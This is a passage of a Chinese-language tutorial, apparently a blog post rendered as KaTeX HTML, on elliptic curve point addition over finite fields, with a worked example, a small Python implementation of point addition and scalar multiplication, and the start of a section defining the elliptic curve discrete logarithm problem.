</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mclose">?</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>【</mtext><mi>P</mi><mi>r</mi><mi>o</mi><mi>o</mi><mi>f</mi><mtext>】</mtext><mi>λ</mi><mo>=</mo><mfrac><mrow><mn>7</mn><mo>−</mo><mn>22</mn></mrow><mn>1</mn></mfrac><mo>=</mo><mo>−</mo><mn>15</mn><mo>≡</mo><mn>8</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>23</mn><mo separator="true">;</mo><mspace width="1em"/><msub><mi>x</mi><mn>3</mn></msub><mo>=</mo><msup><mn>8</mn><mn>2</mn></msup><mo>−</mo><mn>0</mn><mo>−</mo><mn>1</mn><mo>≡</mo><mn>63</mn><mo>≡</mo><mn>17</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>23</mn><mo separator="true">;</mo><mspace width="1em"/><msub><mi>y</mi><mn>3</mn></msub><mo>=</mo><mn>8</mn><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>17</mn><mo stretchy="false">)</mo><mo>−</mo><mn>22</mn><mo>≡</mo><mo>−</mo><mn>158</mn><mo>≡</mo><mn>3</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>23</mn></mrow><annotation encoding="application/x-tex">【Proof】\lambda= \frac {7-22}{1}=-15\equiv 8mod23;
\quad x_3=8^2-0-1\equiv63\equiv17mod23;
\quad y_3=8(0-17)-22\equiv-158\equiv3mod23
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">【</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">】</span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">8</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord">5</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mord">3</span></span></span></span></span></p>
<p>和 sage 算出来的一样</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># ECC 在 Fp 域上加法、倍乘运算</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 求 value 在 Fp 域的逆 —— 用于分数求逆</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_inverse</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> value<span class="token punctuation">)</span> <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">return</span> i</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 求最大公约数 —— 用于约分化简</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_gcd</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> x</pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">return</span> get_gcd<span class="token punctuation">(</span>y<span class="token punctuation">,</span> x <span class="token operator">%</span> y<span class="token punctuation">)</span>  </pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#calculat P+Q</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">calculate_p_q</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    flag <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 控制符号位</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">if</span> x1 <span class="token operator">==</span> x2 <span class="token keyword">and</span> y1 <span class="token operator">==</span> y2<span class="token punctuation">:</span>  <span class="token comment"># 若 P = Q，则 k=[(3x1^2+a)/2y1] mod p</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        member <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x1 <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> a  <span class="token comment"># 计算分子</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        denominator <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> y1        <span class="token comment"># 计算分母</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># 若 P≠Q，则 k=(y2-y1)/(x2-x1) mod p</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        member <span class="token operator">=</span> y2 <span class="token operator">-</span> y1</pre></td></tr><tr><td data-num="27"></td><td><pre>        denominator <span class="token operator">=</span> x2 <span class="token operator">-</span> x1 </pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">if</span> member<span class="token operator">*</span> denominator <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            flag <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            member <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>member<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            denominator <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>denominator<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    </pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment"># 将分子和分母化为最简</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    gcd_value <span class="token operator">=</span> get_gcd<span class="token punctuation">(</span>member<span class="token punctuation">,</span> denominator<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    member <span class="token operator">=</span> member <span class="token operator">//</span> gcd_value</pre></td></tr><tr><td data-num="36"></td><td><pre>    denominator <span class="token operator">=</span> denominator <span class="token operator">//</span> gcd_value</pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token comment"># 求分母的逆元    </span></pre></td></tr><tr><td data-num="39"></td><td><pre>    inverse_value <span class="token operator">=</span> get_inverse<span class="token punctuation">(</span>denominator<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    k <span class="token operator">=</span> <span class="token punctuation">(</span>member <span class="token operator">*</span> inverse_value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        k <span class="token operator">=</span> <span class="token operator">-</span>k</pre></td></tr><tr><td data-num="43"></td><td><pre>    k <span class="token operator">=</span> k <span class="token operator">%</span> p</pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token comment"># 计算 x3,y3</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="47"></td><td><pre>        x3≡k^2-x1-x2(mod p)</pre></td></tr><tr><td data-num="48"></td><td><pre>        y3≡k(x1-x3)-y1(mod p)</pre></td></tr><tr><td data-num="49"></td><td><pre>    """</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    x3 <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> x1 <span class="token operator">-</span> x2<span class="token punctuation">)</span> <span class="token operator">%</span> p</pre></td></tr><tr><td data-num="51"></td><td><pre>    y3 <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> <span class="token punctuation">(</span>x1 <span class="token operator">-</span> x3<span class="token punctuation">)</span> <span class="token operator">-</span> y1<span class="token punctuation">)</span> <span class="token operator">%</span> p</pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">[</span>x3<span class="token punctuation">,</span>y3<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    </pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment">#calculat nP</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">def</span> <span class="token function">calculate_np</span><span class="token punctuation">(</span>p_x<span class="token punctuation">,</span> p_y<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    tem_x <span class="token operator">=</span> p_x</pre></td></tr><tr><td data-num="57"></td><td><pre>    tem_y <span class="token operator">=</span> p_y</pre></td></tr><tr><td data-num="58"></td><td><pre>    times<span class="token operator">=</span>t</pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>         p_value <span class="token operator">=</span> calculate_p_q<span class="token punctuation">(</span>tem_x<span class="token punctuation">,</span>tem_y<span class="token punctuation">,</span> p_x<span class="token punctuation">,</span> p_y<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>         tem_x <span class="token operator">=</span> p_value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="62"></td><td><pre>         tem_y <span class="token operator">=</span> p_value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">return</span> p_value</pre></td></tr><tr><td data-num="64"></td><td><pre>        </pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token comment"># F：y^2=x^3+x+1(mod 23)</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token comment">#a, b, p = 1, 1, 23</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token comment">#calculat P+Q, p=(3,10) q=(9,7)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>calculate_p_q<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre> </pre></td></tr><tr><td data-num="71"></td><td><pre> <span class="token comment">#calculat 20P, p=(3,10)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>calculate_np<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="有限域上椭圆曲线离散对数问题"><a class="anchor" href="#有限域上椭圆曲线离散对数问题">#</a> 有限域上椭圆曲线离散对数问题</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><mi>E</mi><mtext>是有限域</mtext><msub><mi>F</mi><mi>p</mi></msub><mtext>上的椭圆曲线，</mtext><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo>∈</mo><mi>E</mi><mo stretchy="false">(</mo><msub><mi>F</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mtext>，典型的就是给定</mtext><mi>P</mi><mtext>和</mtext><mi>n</mi><mi>P</mi><mtext>，求出</mtext><mi>n</mi><mtext>的值；记作</mtext><mi>n</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>并称</mtext><mi>p</mi><mtext>是以</mtext><mi>Q</mi><mtext>为底的椭圆曲线离散对数。</mtext></mrow><annotation encoding="application/x-tex">设E是有限域F_p上的椭圆曲线，P,Q\in E(F_p)，典型的就是给定P和nP，求出n的值；记作n=log_p(Q),并称 p是以 Q为底  的椭圆曲线离散对数。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">设</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">典</span><span class="mord cjk_fallback">型</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">定</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">出</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">称</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">以</span><span class="mord mathnormal">Q</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">底</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>设</mtext><msub><mi>F</mi><mn>73</mn></msub><mtext>上的椭圆曲线：</mtext><mi>E</mi><mo>:</mo><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mn>8</mn><mi>x</mi><mo>+</mo><mn>7</mn><mspace width="1em"/><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mn>32</mn><mo separator="true">,</mo><mn>53</mn><mo stretchy="false">)</mo><mspace width="1em"/><mi>Q</mi><mo stretchy="false">(</mo><mn>39</mn><mo separator="true">,</mo><mn>17</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>计算得知</mtext><mi>Q</mi><mo>=</mo><mn>11</mn><mi>P</mi><mo separator="true">,</mo><mtext>于是</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><mn>11</mn></mrow><annotation encoding="application/x-tex">设F_{73}上的椭圆曲线：E:y^2=x^3+8x+7\quad P=(32,53) \quad Q(39, 17),计算得知Q=11P,于是log_p(Q)=11
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">设</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" 